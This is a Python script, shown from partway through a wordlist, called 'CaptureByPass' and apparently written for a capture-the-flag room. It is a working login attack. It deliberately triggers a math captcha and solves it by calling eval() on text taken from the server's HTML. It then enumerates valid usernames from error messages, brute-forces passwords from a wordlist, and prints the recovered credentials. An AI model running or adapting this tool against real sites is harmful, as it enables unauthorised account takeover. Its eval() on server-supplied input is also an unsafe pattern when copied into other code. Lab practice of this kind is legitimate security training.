'madge', 'orville']

# Default Wordlists Sizes
DEFAULT_PASSLIST_SIZE = int(len(DEFAULT_PASSLIST))
DEFAULT_USERLIST_SIZE = int(len(DEFAULT_USERLIST))

class Arguments:
    """ The `Arguments` class encapsulates the parsing of command-line arguments for the "CaptureByPass" script.
    
    Methods:
    - run(): Parses command-line arguments and returns a dictionary with the parsed values.
    """
    
    def run(self):
        """   
        Returns(dict):
            - 'url': A string representing the URL obtained from the command line (required).
            - 'passlist': A list of passwords obtained either from the specified passlist file or a default passlist if not provided.
            - 'userlist': A list of usernames obtained either from the specified userlist file or a default userlist if not provided.
            - 'passlist_size': An integer representing the size of the password list.
            - 'userlist_size': An integer representing the size of the user list.
        """
        
        parser = argparse.ArgumentParser(description='CaptureByPass Args')
        
        parser.add_argument('-p', '--passlist', type=str)
        parser.add_argument('-u', '--userlist', type=str)
        parser.add_argument('--url', type=str, required=True)
        
        args = parser.parse_args()
        
        if args.passlist:tmp_passlist, tmp_passlist_size = Utils.getList(filepath=str(args.passlist))
        else:tmp_passlist, tmp_passlist_size = DEFAULT_PASSLIST, DEFAULT_PASSLIST_SIZE
        
        if args.userlist:tmp_userlist, tmp_userlist_size = Utils.getList(filepath=str(args.userlist))
        else:tmp_userlist, tmp_userlist_size = DEFAULT_PASSLIST, DEFAULT_PASSLIST_SIZE
        
        tmp_url = str(Utils.getUrl(url=str(args.url)))
        
        return {
            'url': str(tmp_url),
            'passlist': list(tmp_passlist),
            'userlist': list(tmp_userlist),
            'passlist_size': int(tmp_passlist_size),
            'userlist_size': int(tmp_userlist_size),
        }
        
class Banner:
    
    def _1():
        return f"""{SEPARATOR}
{PROYECT_TITLE}         {AUTHOR} ({AUTHOR_NICKNAME})
{SEPARATOR}
   _____                _                   _ 
  / ____|   /\         | |  ByPass Script  | |
 | |       /  \   _ __ | |_ _ __ _   _  ___| |
 | |      / /\ \ | '_ \| __| '__| | | |/ _ \ |
 | |____ / ____ \| |_) | |_| |  | |_| |  __/_|
  \_____/_/    \_\ .__/ \__|_|   \__,_|\___(_)
                 | |                          
                 |_| (Code by 14Wual)
{SEPARATOR}
Author Web: {AUTHOR_URL}
CTF Room: {ROOM_LINK}
{SEPARATOR}"""
    
    def _2(argsdict:dict, ddtthhmm:str):
        return f"""rURL: {argsdict.get('url')}
{SEPARATOR}
PassList Size: {argsdict.get('passlist_size')}
UserList Size: {argsdict.get('userlist_size')}
{SEPARATOR}
[Info] Started at: {ddtthhmm}"""
        
class Utils:
    """
    Utility class providing various static methods for file and URL operations.
    Parameters:
        - filepath (str): The path to the file.
        - url (str): The URL to be checked.
    """
        
    @staticmethod
    @functools.lru_cache(maxsize=128)
    def getListLines(filepath:str):
        """
        Reads lines from a file and returns a list of stripped lines.
        Returns: List of stripped lines from the file.
        """
        return [line.strip() for line in open(filepath, 'r').readlines()]
    
    @staticmethod
    def existsFile(filepath:str) -> bool:
        """
        Checks if a file exists at the given filepath.
        Returns: True if the file exists, False otherwise.
        """
        return os.path.isfile(filepath)
    
    @staticmethod
    def isReadable(filepath:str) -> bool:
        """
        Checks if a file is readable and has the necessary permissions.
        Returns: True if the file is readable, False otherwise.
        """
        try:
            try:open(filepath, 'r');return True
            except (PermissionError):raise PermissionError(f'[Error] PermissionError: The script does not have the permissions to read the file ({filepath}).')
            except (FileNotFoundError):raise FileNotFoundError(f'[Error] FileNotFoundError: The file ({filepath}) is not readable.')
        except Exception as error:print(error);exit(0)
    
    @staticmethod
    def fileChecks(func):
        """
        Decorator function to perform file existence checks before calling the decorated function.
        Returns: Decorated function.
        """
        
        def wrapper(filepath:str, *args, **kwargs):
            try:
                if Utils.existsFile(filepath=filepath) == False:raise ArgsError(f'[Error] ArgsError: The file ({filepath}) does not exist.')
            except Exception as error:print(error);exit(0)
            finally:Utils.existsFile(filepath=filepath);return func(filepath, *args, **kwargs)
        return wrapper
    
    @fileChecks
    def getList(filepath):
        """
        Gets a list of lines from a file and its length.
        Returns: A tuple containing the list of lines and its length.
        """
        tmp_list = Utils.getListLines(filepath=filepath)
        return list(tmp_list), int(len(tmp_list))
    
    @staticmethod
    def checkRequest(url:str):
        """
        Checks if a URL is accessible using an HTTP HEAD request.
        Raises: requests.exceptions.RequestException: If the URL is not accessible.
        """
        try:
            try:requests.head(url, timeout=5).raise_for_status()
            except requests.exceptions.RequestException as error:raise requests.exceptions.RequestException(f'[Error] RequestException: The url ({url}) is not accessible.')
        except Exception as error:print(error);exit(0)
    
    @staticmethod
    def addHttp(url:str):
        """
        Adds 'http://' to a URL if it does not start with 'http://' or 'https://'.
        Returns: Modified URL.
        """
        return "http://" + url if not url.startswith("http://") and not url.startswith("https://") else url
    
    @staticmethod
    def deletInUrl(url:str, delete:str='/login'):
        """
        Deletes a specified substring from a URL. (Default: '/login')

        Parameters:
        - url (str): The URL to be modified.
        - delete (str): The substring to be deleted.

        Returns: Modified URL.
        """
        return url.replace(delete, "")
        
    @staticmethod
    def checkUrl(func):
        """
        Decorator function to perform URL accessibility checks before calling the decorated function.
        Returns: Decorated function.
        """
        
        def wrapper(url:str, *args, **kwargs):
            tmp_url = Utils.addHttp(url=Utils.deletInUrl(url=url))
            Utils.checkRequest(url=tmp_url);return func(tmp_url, *args, **kwargs)
            
        return wrapper
    
    @checkUrl
    def getUrl(url):
        """
        Gets a modified and accessible URL.

        Parameters:
        - url (str): The original URL.

        Returns:
        - str: Modified and accessible URL.
        """
        
        return str(url)
    
    @staticmethod
    def getDateTime():
        """
        Gets the current date and time in the format "%d:%m/%Y - %H:%M:%S".
        Returns: Current date and time.
        """
        
        return datetime.now().strftime("%d:%m/%Y - %H:%M:%S")
    
class Boot:
    """
    Boot class for initializing the application.

    Attributes:
    - arguments: A dictionary containing parsed command-line arguments.
    - started: A string representing the date and time when the application was started.

    Methods:
    - __init__: Initializes the Boot instance.
    """
    
    def __init__(self) -> None:
        """
        Initializes the Boot instance. Prints the first banner, sets up command-line arguments, 
        and prints the second banner.
        """
        
        print(Banner._1())
        
        self.arguments = Arguments().run()
        self.started = Utils.getDateTime()
        
        print(Banner._2(argsdict=self.arguments, ddtthhmm=self.started))
    
class ByPass(Boot):
    """
    ByPass class extending Boot for automated login bypass attempts.

    Attributes:
    - errors: Counter for tracking the number of errors during requests.
    - username: Discovered username during the process.
    - password: Discovered password during the process.

    Methods:
    - __init__: Initializes the ByPass instance and performs the automated login bypass.
    - sendRequest: Sends a login request to the specified URL with provided credentials and captcha.
    - discoverPass: Attempts to discover the password for a given username.
    - getCaptcha: Extracts and returns the captcha expression from the response HTML.
    - resolveCaptcha: Evaluates the captcha expression and returns the result.
    - EnableCaptcha: Enables captcha by sending requests until it is triggered, returns the captcha expression.
    - discoverUser: Attempts to discover a valid username with a test password and captcha.
    """
    
    def __init__(self) -> None:
        """
        Initializes the ByPass instance and performs automated login bypass.
        Prints information about the discovered username and password, opens a new browser tab with the login URL,
        and exits the program.
        """
        
        super().__init__()
        self.errors=0
        
        self.username, tmp_captcha = self.discoverUser()
        print(f"[Info] Discovered username: {Fore.GREEN}{self.username}{Style.RESET_ALL}")
        
        self.password = self.discoverPass(username=self.username, next_captcha=tmp_captcha)
        print(f"[Info] Discovered password: {Fore.GREEN}{self.password}{Style.RESET_ALL}")
        
        print(SEPARATOR)
        print(f"[CREDENTIALS] {Fore.GREEN}{self.username}{Style.RESET_ALL}:{Fore.GREEN}{self.password}{Style.RESET_ALL}")
        print(SEPARATOR)
        
        print(f"[Info] Opening New Browser Tab")
        time.sleep(3);webbrowser.open_new_tab(url=self.arguments.get('url') + '/login')
        exit(0)
    
    @staticmethod
    def sendRequest(self, user, pswd, captcha=None):
        """
        Sends a login request to the specified URL with provided credentials and captcha.

        Parameters:
        - self: Instance of the ByPass class.
        - user (str): Username for the login attempt.
        - pswd (str): Password for the login attempt.
        - captcha (str): Captcha expression for the login attempt. Default is None.

        Returns: Text response from the login request.
        """
        
        data = {"username": user, "password": pswd}
        if captcha:data.update({'captcha': captcha})
        
        try:return requests.post(self.arguments.get('url') + '/login', data=data).text
        except:
            self.errors += 1
            if self.errors % 10 == 0:f'{Fore.RED}[Warning] There have been too many erroneous requests.{Style.RESET_ALL}'
        
    def discoverPass(self, next_captcha, username:str):
        """
        Attempts to discover the password for a given username.

        Parameters:
        - next_captcha (str): Captcha expression for the first login attempt.
        - username (str): Username for which the password is to be discovered.

        Returns: Discovered password.
        """
        
        password='';response='';captcha=next_captcha
    
        for tmp_password in self.arguments.get('passlist'):
            
            print(f'[*] Trying Password: {Fore.YELLOW}{tmp_password}{Style.RESET_ALL} for {username}.')
            
            response = ByPass.sendRequest(self, user=username, pswd=tmp_password, captcha=captcha)
            captcha = ByPass.resolveCaptcha(ByPass.getCaptcha(response=response))
            try:
                if not 'Invalid password for user' in response:password=tmp_password;break
            except:print(response)

        return password
    
    @staticmethod
    def getCaptcha(response:str):
        """
        Extracts and returns the captcha expression from the response HTML.

        Parameters:
        - response (str): HTML response from the login attempt.

        Returns: Captcha expression.
        """
        
        try:return re.findall(r'\d+\s*[\+\-\*/]\s*\d+', str(BeautifulSoup(response, 'html.parser')))
        except:return "1014*0"
    
    @staticmethod
    def resolveCaptcha(captcha:str="1014*0"):
        """
        Evaluates the captcha expression and returns the result.

        Parameters:
        - captcha (str): Captcha expression to be evaluated.

        Returns: Result of the captcha expression evaluation.
        """
        
        try:return eval(captcha[0])
        except:pass
    
    @staticmethod
    def EnableCaptcha(self):
        """
        Enables captcha by sending requests until it is triggered, returns the captcha expression.

        Parameters:
        - self: Instance of the ByPass class.

        Returns: Captcha expression.
        """
        
        request='';captcha_enabled = False
        while captcha_enabled == False:
            request = ByPass.sendRequest(self=self, user='14wual', pswd="test")
            if 'Too many bad login attempts!' in request:
                captcha_enabled = True
        
        print("[Info] Captchat enabled.")
        return ByPass.getCaptcha(response=request)
    
    def discoverUser(self):
        """
        Attempts to discover a valid username with a test password and captcha.

        Returns: Discovered username and captcha.
        """
        
        username='';response='';captcha=''
        captcha = ByPass.resolveCaptcha(ByPass.EnableCaptcha(self))
    
        for tmp_username in self.arguments.get('userlist'):
            
            print(f'[*] Trying Username: {Fore.YELLOW}{tmp_username}{Style.RESET_ALL} with the test password.')
            
            response = ByPass.sendRequest(self, user=tmp_username, pswd="test", captcha=captcha)
            captcha = ByPass.resolveCaptcha(ByPass.getCaptcha(response=response))
            if not 'does not exist' in response:username=tmp_username;break

        return username, captcha
    
if __name__ == '__main__':
    """
    Main script execution when the module is run directly.
    Imports required packages, checks for their availability, and initializes the ByPass class.
    """

    packages = ['functools', 'argparse', 'os', 'importlib', 'requests', 'datetime', 'bs4', 're', 'webbrowser', 'time', 'colorama']
    
    def importPips(packagesList:list):
        """
        Imports the specified list of packages and raises ImportError if any package is not installed.

        Parameters:
        - packagesList (list): List of packages to be imported.

        Raises:
        - ImportError: If any of the specified packages is not installed.
        """
        
        for package in packagesList:
            try:
                try:importlib.import_module(package)
                except ImportError:raise ImportError(f'[Error] ImportError: Package ({package}) not installed.')
            except Exception as error:print(error);exit(0)
    
    importPips(packagesList=packages)
    
    # Initialize ByPass Class
    ByPass()